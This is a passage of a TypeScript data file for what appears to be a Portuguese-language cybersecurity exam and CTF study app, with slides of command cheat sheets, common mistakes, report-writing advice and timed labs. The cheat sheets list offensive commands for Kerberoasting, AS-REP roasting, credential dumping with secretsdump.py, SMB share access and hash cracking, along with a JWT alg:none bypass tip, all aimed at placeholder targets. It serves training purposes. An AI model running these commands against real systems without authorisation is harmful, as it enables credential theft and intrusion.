        '# ========== WEB ==========',
        'gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt',
        'ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt',
        'curl -v -X POST -d "user=admin" http://<IP>/login',
        '',
        '# ========== SMB ==========',
        'smbclient -L //<IP> -N',
        'smbclient //<IP>/share -N',
        'crackmapexec smb <IP> -u user -p pass --shares',
        '',
        '# ========== ACTIVE DIRECTORY ==========',
        'GetNPUsers.py <domain>/ -usersfile users.txt -no-pass',
        'GetUserSPNs.py <domain>/user:pass -request',
        'bloodhound-python -d <domain> -u user -p pass -ns <dc_ip> -c All',
        'secretsdump.py <domain>/user:pass@<IP>',
        '',
        '# ========== LINUX PRIVESC ==========',
        'find / -perm -4000 2>/dev/null',
        'sudo -l',
        'getcap -r / 2>/dev/null',
        'cat /etc/crontab',
        '',
        '# ========== WINDOWS PRIVESC ==========',
        'whoami /priv',
        'whoami /groups',
        'systeminfo',
        '',
        '# ========== FORENSE DE MEMÓRIA ==========',
        'python3 vol.py -f mem.raw windows.pslist',
        'python3 vol.py -f mem.raw windows.cmdline',
        'python3 vol.py -f mem.raw windows.netscan',
        'python3 vol.py -f mem.raw windows.malfind',
        '',
        '# ========== HASH CRACKING ==========',
        'hashcat -m 0 hash.txt rockyou.txt      # MD5',
        'hashcat -m 1000 hash.txt rockyou.txt   # NTLM',
        'hashcat -m 18200 hash.txt rockyou.txt  # AS-REP',
        'hashcat -m 13100 hash.txt rockyou.txt  # Kerberoast',
        'john hash.txt --wordlist=rockyou.txt',
        '',
        '# ========== CRIPTOGRAFIA / STEGO ==========',
        'echo "SGVsbG8=" | base64 -d',
        'echo "48656c6c6f" | xxd -r -p',
        'file arquivo.bin; strings arquivo.bin',
        'exiftool imagem.jpg',
        'steghide extract -sf imagem.jpg',
        'binwalk imagem.png',
        'foremost imagem.dd -o output/',
      ]
    }
  },
  {
    id: 'd4-fatal-errors', title: 'Erros Fatais — Nunca Faça Isso', day: 4, topic: 'Revisão',
    type: 'tips',
    content: {
      tips: [
        'Esquecer -Pn quando o host parece offline no Nmap — perde-se minutos por algo trivial',
        'Rodar gobuster sem especificar a wordlist — usa padrão vazio e encontra nada',
        'Assumir que a primeira porta aberta é o vetor — enumere TODAS as portas antes de explorar',
        'Não salvar o output do Nmap (-oN) — perde o scan e precisa refazer',
        'Não verificar acesso anônimo SMB antes de tentar autenticado',
        'Esquecer sudo -l imediatamente após obter um shell',
        'Reportar técnica MITRE errada — leia a descrição completa, não chute pelo nome',
        'Não documentar durante a prova — se não escreveu, não aconteceu',
        'Assumir que SMBv1 = EternalBlue sem verificar o patch level',
        'Usar automação pesada antes da enumeração manual básica',
      ]
    }
  },
  {
    id: 'd4-report', title: 'Como Escrever um Relatório', day: 4, topic: 'Revisão',
    type: 'theory',
    content: {
      theory: [
        '1. Sumário executivo (2 frases): O que aconteceu? Qual o impacto?',
        '2. Timeline: tabela com timestamp | evento | evidência. Ordene cronologicamente.',
        '3. Achados técnicos: para cada finding: descrição, evidência, técnica MITRE.',
        '4. Avaliação de impacto: o que o atacante pode ter acessado/modificado/exfiltrado.',
        '5. Recomendações: ações concretas para mitigar e prevenir.',
      ],
      tips: [
        'Seja específico: "Event ID 4625 às 03:14:22 de 192.168.1.100" não "houve falhas de login"',
        'Cada afirmação deve ter evidência que a suporta',
        'Técnicas MITRE dão credibilidade ao relatório — use os T-numbers corretos',
        'Timeline visual é mais impactante que texto corrido para apresentação',
      ]
    }
  },
  {
    id: 'd4-crypto', title: 'Criptografia e CTF Puzzles', day: 4, topic: 'CTF',
    type: 'commands',
    content: {
      theory: ['Puzzles de criptografia são comuns na categoria Misc/Crypto de CTFs. Conheça as codificações mais frequentes.'],
      commands: [
        '# Base64',
        'echo "SGVsbG8gV29ybGQ=" | base64 -d',
        'echo "Hello World" | base64',
        '',
        '# Hexadecimal',
        'echo "48656c6c6f" | xxd -r -p',
        'echo "Hello" | xxd',
        '',
        '# ROT13',
        'echo "Uryyb Jbeyq" | tr "A-Za-z" "N-ZA-Mn-za-m"',
        '',
        '# Hashes',
        'echo -n "senha" | md5sum',
        'echo -n "senha" | sha256sum',
        '',
        '# Esteganografia',
        'exiftool imagem.jpg            # metadados',
        'steghide info imagem.jpg       # verificar dados ocultos',
        'steghide extract -sf imagem.jpg -p ""   # extrair sem senha',
        'binwalk imagem.png             # arquivos embutidos',
        'foremost imagem.dd -o output/  # file carving',
        'strings imagem.png | grep -i flag',
        '',
        '# JWT',
        'cat token.txt | cut -d"." -f2 | base64 -d 2>/dev/null | python3 -m json.tool',
      ],
      tips: [
        'CyberChef (gchq.github.io/CyberChef): ferramenta online para qualquer codificação',
        'JWT com alg:none: remover assinatura pode bypassar verificação',
        'XOR com chave repetida: se chave curta, análise de frequência funciona',
        'Bacon cipher, Morse: reconheça os padrões visuais antes de tentar ferramentas',
      ]
    }
  },
  {
    id: 'd4-labs', title: 'Laboratórios Extra — Dia 4 (Cronometrados)', day: 4, topic: 'Labs',
    type: 'lab',
    content: {
      note: 'Todos os labs do Dia 4 têm cronômetro obrigatório. Simule condições reais de prova. Documente tudo conforme avança — não revise depois.'
    }
  },
];

export const slides: Slide[] = [...intensiveSlides, ...expandedTheorySlides, ...tenHourWorkshopSlides, ...commandManualSlides, ...baseSlides];
